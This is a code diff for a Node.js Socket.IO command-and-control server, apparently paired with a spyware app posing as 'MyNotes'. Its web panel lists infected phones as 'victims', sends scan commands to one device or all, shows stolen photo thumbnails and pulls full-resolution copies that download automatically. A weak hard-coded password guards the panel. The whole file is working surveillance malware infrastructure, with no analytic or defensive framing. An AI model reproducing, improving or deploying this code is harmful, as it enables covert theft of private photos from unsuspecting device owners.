@@ -6,257 +6,201 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-// --- 1. SEGURIDAD ---
-const AUTH_PASS = "admin123"; // Tu contraseña
+// --- CONFIGURACIÓN ---
+const AUTH_PASS = "admin123"; 
 
+// --- INTERFAZ WEB ---
 app.get('/', (req, res) => {
     if (req.query.auth !== AUTH_PASS) {
-        return res.send(`
-            <body style="background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
-                <div style="text-align:center;">
-                    <h2>🔒 ACCESO RESTRINGIDO</h2>
-                    <input type="password" id="pass" placeholder="Contraseña..." style="padding:10px; border-radius:5px; border:none;">
-                    <button style="padding:10px; cursor:pointer;" onclick="window.location.href='/?auth='+document.getElementById('pass').value">ENTRAR</button>
-                </div>
-            </body>
-        `);
+        return res.send(`<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>⛔ ACCESO DENEGADO</h2></body>`);
     }
 
     res.send(`
     <html>
         <head>
-            <title>MyNotes C&C Ultimate</title>
+            <title>MyNotes C&C TARGET</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
+            <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
             <style>
-                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 20px; }
+                :root { --bg: #0d0d0d; --panel: #161616; --primary: #00e676; --accent: #2979ff; --text: #e0e0e0; }
+                body { font-family: 'Roboto Mono', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
                 
-                /* PANEL DE CONTROL FLOTANTE */
-                .dashboard {
-                    position: sticky; top: 0; z-index: 100;
-                    background: #1e1e1e; padding: 15px; border-radius: 10px;
-                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
-                    margin-bottom: 20px;
-                }
+                .container { display: grid; grid-template-columns: 300px 1fr; height: 100%; }
+                
+                /* BARRA LATERAL */
+                .sidebar { background: var(--panel); border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; gap: 20px; }
+                .logo { color: var(--primary); font-size: 14px; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 15px; }
 
-                .status-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; }
-                #status { font-weight: bold; }
-                h3 { margin: 0; color: #bbb; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }
+                /* CONTROLES */
+                .control-group { background: #222; padding: 10px; border-radius: 6px; border: 1px solid #333; }
+                .label { font-size: 10px; color: #888; text-transform: uppercase; margin-bottom: 5px; display:block; }
+                
+                select { width: 100%; padding: 8px; background: #000; border: 1px solid #444; color: white; border-radius: 4px; outline: none; font-family: inherit; }
+                select:focus { border-color: var(--accent); }
 
-                /* GRID DE SELECTORES */
-                .selectors { display: grid; grid-template-columns: 2fr 1fr; gap: 10px; margin-bottom: 10px; }
-                
-                select {
-                    padding: 10px; background: #2c2c2c; color: white; border: 1px solid #444; 
-                    border-radius: 5px; font-weight: bold; width: 100%; outline: none;
-                }
-                select:focus { border-color: #2979ff; }
+                button { width: 100%; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; color: white; font-family: inherit; font-size: 12px; }
+                .btn-scan { background: var(--accent); }
+                .btn-stop { background: #ff1744; }
+                .btn-scan:hover { opacity: 0.8; }
 
-                /* BOTONES DE COMANDO */
-                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-                .full-width { grid-column: span 2; }
+                /* ZONA DE FOTOS */
+                .main-area { padding: 20px; overflow-y: auto; background: #0a0a0a; position: relative; }
+                .header-stats { position: sticky; top: 0; background: rgba(10,10,10,0.9); padding: 10px 0; border-bottom: 1px solid #333; margin-bottom: 15px; z-index: 10; display:flex; justify-content:space-between; font-size: 12px; }
                 
-                button { 
-                    padding: 12px; border: none; border-radius: 5px; font-weight: bold; 
-                    cursor: pointer; color: white; transition: 0.2s; font-size: 13px;
-                }
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
                 
-                .btn-start { background: #2979ff; } 
-                .btn-start:hover { background: #1565c0; }
+                .card { background: #1e1e1e; border-radius: 6px; overflow: hidden; border: 1px solid #333; position: relative; transition: 0.2s; }
+                .card:hover { border-color: var(--accent); transform: translateY(-2px); }
+                .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; }
                 
-                .btn-stop { background: #d50000; } 
-                .btn-stop:hover { background: #b71c1c; }
+                .card-footer { padding: 8px; font-size: 10px; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; }
+                .btn-hd { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 4px 8px; width: auto; margin: 0; }
+                .btn-hd:hover { background: var(--primary); color: black; }
 
-                .btn-freeze { background: #ff9100; color: black; } 
-                .btn-freeze:hover { background: #ff6d00; }
-
-                /* GRILLA DE FOTOS */
-                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
-                
-                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; animation: fadeIn 0.3s; }
-                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-                .card img { width: 100%; height: 100px; object-fit: cover; }
-                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
-                
-                .badge {
-                    position: absolute; top: 0; right: 0; background: rgba(0,0,0,0.8); 
-                    color: #fff; padding: 3px 6px; font-size: 9px; border-bottom-left-radius: 5px;
-                }
+                .victim-tag { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.8); color: white; padding: 2px 6px; border-radius: 3px; font-size: 9px; pointer-events: none; }
             </style>
         </head>
         <body>
-            <div class="dashboard">
-                <div class="status-row">
-                    <span>📡 ESTADO: <span id="status" style="color:#ff1744">Esperando...</span></span>
-                    <span id="counter" style="color:#00e676">0 fotos</span>
-                </div>
+            <div class="container">
+                <div class="sidebar">
+                    <div class="logo">☠️ C&C CONTROL v3 (Render Fix)</div>
 
-                <div class="selectors">
-                    <div>
-                        <h3>🎯 OBJETIVO</h3>
-                        <select id="victimSelector">
+                    <div class="control-group">
+                        <span class="label">1. SELECCIONAR OBJETIVO</span>
+                        <select id="victimSelector" onchange="onTargetChange()">
                             <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
                         </select>
                     </div>
-                    
-                    <div>
-                        <h3>📂 CARPETA</h3>
-                        <select id="folderFilter" onchange="applyFilter()">
-                            <option value="ALL">Todas</option>
-                        </select>
+
+                    <div class="control-group">
+                        <span class="label">2. ACCIONES</span>
+                        <button class="btn-scan" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
+                        <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
+                    </div>
+
+                    <div class="control-group" style="margin-top:auto">
+                        <span class="label">LOG DE CONEXIÓN</span>
+                        <div id="status" style="font-size:10px; color:#666;">Esperando...</div>
                     </div>
                 </div>
-                
-                <div class="controls">
-                    <button class="btn-start" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
-                    <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
-                    
-                    <button id="btnFreeze" class="btn-freeze full-width" onclick="toggleFreeze()">👀 CONGELAR PANTALLA</button>
+
+                <div class="main-area">
+                    <div class="header-stats">
+                        <span id="viewingInfo">Viendo: TODOS</span>
+                        <span>Fotos: <span id="count">0</span></span>
+                    </div>
+                    <div class="grid" id="grid"></div>
                 </div>
             </div>
-
-            <div class="grid" id="grid"></div>
 
             <script src="/socket.io/socket.io.js"></script>
             <script>
                 const socket = io();
-                const grid = document.getElementById('grid');
-                const victimSelector = document.getElementById('victimSelector');
-                const folderFilter = document.getElementById('folderFilter');
-                const counter = document.getElementById('counter');
-                const btnFreeze = document.getElementById('btnFreeze');
                 
+                // ESTADO LOCAL
+                let victimsMap = {}; // Guardamos ID -> Nombre
                 let photoCount = 0;
-                let knownFolders = new Set();
-                let isFrozen = false;
-                let pendingBuffer = []; // Cola de espera para fotos congeladas
 
-                // --- 1. GESTIÓN DE VÍCTIMAS ---
-                socket.on('update_device_list', (devices) => {
-                    const currentSelection = victimSelector.value;
-                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(devices).length + ')</option>';
+                // --- 1. GESTIÓN DE DISPOSITIVOS ---
+                socket.on('update_device_list', (victims) => {
+                    victimsMap = victims;
+                    const selector = document.getElementById('victimSelector');
+                    const currentVal = selector.value;
                     
-                    for (const [socketId, info] of Object.entries(devices)) {
-                        html += \`<option value="\${socketId}">📱 \${info.name} (\${info.id.substring(0,4)}...)</option>\`;
+                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(victims).length + ')</option>';
+                    for (const [id, info] of Object.entries(victims)) {
+                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                     }
-                    victimSelector.innerHTML = html;
+                    selector.innerHTML = html;
+                    selector.value = currentVal; // Mantener selección
                     
-                    // Intentar mantener la selección previa si el dispositivo sigue conectado
-                    if (devices[currentSelection] || currentSelection === 'ALL') {
-                        victimSelector.value = currentSelection;
-                    }
+                    document.getElementById('status').innerText = "Dispositivos: " + Object.keys(victims).length;
+                    document.getElementById('status').style.color = "#00e676";
                 });
 
-                // --- 2. COMANDOS ---
-                function sendCommand(action) {
-                    const targetId = victimSelector.value;
-                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
+                // --- 2. FILTRADO VISUAL (TARGETING) ---
+                function onTargetChange() {
+                    const targetId = document.getElementById('victimSelector').value;
+                    const cards = document.getElementsByClassName('card');
                     
-                    // Enviar comando al servidor especificando el objetivo
-                    socket.emit('admin_command', { action: cmd, target: targetId });
-                }
+                    // Actualizar texto superior
+                    const name = targetId === "ALL" ? "TODOS" : (victimsMap[targetId]?.name || "Desconocido");
+                    document.getElementById('viewingInfo').innerText = "Viendo: " + name;
 
-                // --- 3. LÓGICA DE CONGELAR (PAUSA) ---
-                function toggleFreeze() {
-                    isFrozen = !isFrozen;
-                    if (isFrozen) {
-                        btnFreeze.innerText = "⏸ PANTALLA CONGELADA (Acumulando...)";
-                        btnFreeze.style.background = "#00bcd4"; // Cyan
-                        btnFreeze.style.color = "white";
-                    } else {
-                        btnFreeze.innerText = "👀 CONGELAR PANTALLA";
-                        btnFreeze.style.background = "#ff9100"; // Naranja
-                        btnFreeze.style.color = "black";
-                        
-                        // Procesar todo lo acumulado de golpe
-                        if (pendingBuffer.length > 0) {
-                            pendingBuffer.forEach(data => processNewImage(data));
-                            pendingBuffer = [];
+                    // Ocultar/Mostrar fotos según selección
+                    for (let card of cards) {
+                        const owner = card.getAttribute('data-owner');
+                        if (targetId === "ALL" || owner === targetId) {
+                            card.style.display = "block";
+                        } else {
+                            card.style.display = "none";
                         }
                     }
                 }
 
-                // --- 4. RECIBIR FOTOS ---
+                // --- 3. RECIBIR FOTOS (PREVIEW) ---
                 socket.on('new_preview', data => {
-                    if (isFrozen) {
-                        // Si está congelado, guardamos en memoria pero no mostramos
-                        pendingBuffer.push(data);
-                        btnFreeze.innerText = "▶ REANUDAR (" + pendingBuffer.length + " pendientes)";
-                    } else {
-                        processNewImage(data);
-                    }
-                });
-
-                function processNewImage(data) {
-                    // Actualizar filtro de carpetas dinámicamente
-                    if (!knownFolders.has(data.folder)) {
-                        knownFolders.add(data.folder);
-                        const opt = document.createElement('option');
-                        opt.value = data.folder;
-                        opt.innerText = "📂 " + data.folder;
-                        folderFilter.appendChild(opt);
-                    }
                     renderCard(data);
-                }
-
-                socket.on('receive_full', data => {
-                    downloadBase64File(data.image64, data.name);
-                    const card = document.getElementById(data.path);
-                    if(card) {
-                        card.classList.add('hd');
-                        card.querySelector('button').innerText = "✅ DESCARGADO";
-                        card.querySelector('button').style.background = "#00c853";
-                    }
                 });
 
-                // --- RENDERIZADO ---
                 function renderCard(data) {
-                    if(document.getElementById(data.path)) return; // Evitar duplicados
-                    photoCount++;
-                    counter.innerText = photoCount + " fotos";
+                    if(document.getElementById(data.path)) return; // No duplicar
 
+                    // Crear tarjeta
                     const div = document.createElement('div');
                     div.className = 'card';
                     div.id = data.path;
-                    div.setAttribute('data-folder', data.folder);
+                    div.setAttribute('data-owner', data.victimId); // IMPORTANTE: Guardamos el dueño en el HTML
+
+                    const ownerName = victimsMap[data.victimId]?.name || "Desconocido";
+
                     div.innerHTML = \`
-                        <span class="badge">\${data.folder}</span>
-                        <img src="data:image/jpeg;base64,\${data.image64}">
-                        <button style="width:100%; padding:5px; background:#6200ea; border:none; color:white; font-weight:bold; cursor:pointer;" onclick="pedirHD('\${data.path}')">⚡ HD</button>
+                        <div class="victim-tag">\${ownerName}</div>
+                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')">
+                        <div class="card-footer">
+                            <span>\${data.folder.substring(0,10)}...</span>
+                            <button class="btn-hd" onclick="pedirHD('\${data.path}', '\${data.victimId}')">⚡ HD</button>
+                        </div>
                     \`;
-                    
-                    // Respetar filtro de carpeta actual
-                    if (folderFilter.value !== "ALL" && folderFilter.value !== data.folder) {
+
+                    // Aplicar filtro inmediato si estamos viendo a otro usuario
+                    const currentTarget = document.getElementById('victimSelector').value;
+                    if (currentTarget !== "ALL" && currentTarget !== data.victimId) {
                         div.style.display = "none";
                     }
-                    grid.prepend(div);
+
+                    document.getElementById('grid').prepend(div);
+                    photoCount++;
+                    document.getElementById('count').innerText = photoCount;
                 }
 
-                function applyFilter() {
-                    const sel = folderFilter.value;
-                    const cards = document.getElementsByClassName('card');
-                    for(let c of cards) {
-                        c.style.display = (sel === "ALL" || c.getAttribute('data-folder') === sel) ? "block" : "none";
-                    }
+                // --- 4. PEDIR HD Y DESCARGAR ---
+                function pedirHD(path, targetId) {
+                    // Enviamos al servidor: "Quiero esta foto (path) de este usuario (targetId)"
+                    console.log("Pidiendo HD a:", targetId);
+                    socket.emit('order_download', { path: path, target: targetId });
                 }
 
-                function pedirHD(path) { 
-                    socket.emit('order_download', { path: path }); 
-                }
+                socket.on('receive_full', data => {
+                    // Cuando llega la HD, la descargamos automáticamente
+                    const a = document.createElement('a');
+                    a.href = "data:image/jpeg;base64," + data.image64;
+                    a.download = "HD_" + data.name;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
 
-                function downloadBase64File(base64Data, fileName) {
-                    const link = document.createElement('a');
-                    link.href = "data:image/jpeg;base64," + base64Data;
-                    link.download = fileName;
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                }
-                
-                socket.on('connection_alert', msg => {
-                    document.getElementById('status').innerText = msg;
-                    document.getElementById('status').style.color = msg.includes("Admin") ? "#00e676" : "#ff1744";
+                    // Feedback visual
+                    const card = document.getElementById(data.path);
+                    if(card) card.style.border = "1px solid #00e676";
                 });
+
+                // --- 5. COMANDOS ---
+                function sendCommand(action) {
+                    const target = document.getElementById('victimSelector').value;
+                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
+                    socket.emit('admin_command', { action: cmd, target: target });
+                }
             </script>
         </body>
     </html>
@@ -264,53 +208,68 @@ app.get('/', (req, res) => {
 });
 
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });
 
-// ALMACÉN DE VÍCTIMAS
+// --- CONFIGURACIÓN CRÍTICA DE SOCKET.IO ---
+const io = new Server(server, { 
+    cors: { origin: "*" }, 
+    allowEIO3: true,         // <--- ¡ESTA ES LA LÍNEA MÁGICA QUE FALTABA!
+    maxHttpBufferSize: 1e8   // 100MB
+});
+
+// --- BASE DE DATOS VOLÁTIL ---
 let victims = {};
 
 io.on('connection', (socket) => {
     
-    // 1. Identificar conexión
+    console.log(`🔌 Conexión: ${socket.id}`);
+
+    // 1. REGISTRO DE VÍCTIMA
     socket.on('usrData', (data) => {
-        // Registro de dispositivo
         if (data.dataType === 'register_device') {
             victims[socket.id] = { name: data.deviceName, id: data.deviceId };
-            console.log(`📱 Nueva Víctima: ${data.deviceName} (${socket.id})`);
-            io.emit('update_device_list', victims); // Actualizar selectores
+            console.log(`📱 REGISTRADO: ${data.deviceName} (${socket.id})`);
+            io.emit('update_device_list', victims);
         }
-        // Fotos
         else if (data.dataType === 'preview_image') {
-            io.emit('new_preview', data); 
+            // Le pegamos el ID del socket a la foto para saber de quién es
+            data.victimId = socket.id;
+            socket.broadcast.emit('new_preview', data);
         }
         else if (data.dataType === 'full_image') {
-            io.emit('receive_full', data);
+            socket.broadcast.emit('receive_full', data);
         }
     });
 
-    // 2. Comandos Admin (Ahora con target)
+    // 2. COMANDOS (TARGETING)
     socket.on('admin_command', (cmd) => {
+        console.log(`💻 CMD: ${cmd.action} -> ${cmd.target}`);
+        
         if (cmd.target === 'ALL') {
             socket.broadcast.emit('command_' + cmd.action); // A todos
-        } else if (victims[cmd.target]) {
-            io.to(cmd.target).emit('command_' + cmd.action); // A uno específico
+        } else {
+            io.to(cmd.target).emit('command_' + cmd.action); // Solo al seleccionado
         }
     });
 
-    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
+    // 3. PETICIÓN HD (TARGETING)
+    socket.on('order_download', (data) => {
+        console.log(`⬇️ HD: ${data.path}`);
+        if(data.target) {
+            io.to(data.target).emit('request_full_image', { path: data.path });
+        }
+    });
 
-    // 3. Desconexión
+    // 4. DESCONEXIÓN
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
-            console.log(`❌ Se fue: ${victims[socket.id].name}`);
+            console.log(`❌ SE FUE: ${victims[socket.id].name}`);
             delete victims[socket.id];
             io.emit('update_device_list', victims);
         }
     });
     
-    // Al conectar Admin, enviar lista actual
+    // Enviar lista actual al conectar
     socket.emit('update_device_list', victims);
-    socket.emit('connection_alert', '✅ Panel Admin Conectado');
 });
 
-server.listen(process.env.PORT || 3000, () => console.log('Servidor Ultimate Listo'));
+server.listen(PORT, () => console.log(`🚀 SERVIDOR LISTO EN PUERTO ${PORT}`));
